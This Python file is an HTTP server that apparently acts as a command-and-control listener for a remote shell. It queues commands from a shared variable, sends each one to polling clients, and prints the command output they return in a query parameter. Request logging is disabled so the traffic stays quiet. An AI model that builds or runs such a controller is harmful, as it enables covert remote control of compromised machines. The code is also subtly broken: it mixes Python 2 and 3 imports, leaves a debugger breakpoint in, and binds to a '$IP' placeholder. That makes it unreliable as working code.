from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading 
import main 
import pdb;pdb.set_trace()
from time import sleep
from urllib import urlparse, unquote_plus, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if 'output' in self.path:
                rq_url = urlparse(self.path)
                rq_param = parse_qs(rq_url.query)
                print()
                for i in rq_param['q']:
                    print(i.strip())
                self.send_response(200)
                self.end_headers()
                self.wfile.write(main.cmd.encode()) 
                return
        except:
            None
        while main.cmd == '':
            sleep(.20)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(main.cmd.encode())
        main.cmd = ''
    def log_message(self, format, *args):
        return
class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass
def run():
    http = ThreadingSimpleServer(('$IP', 80), Handler)
    http.serve_forever()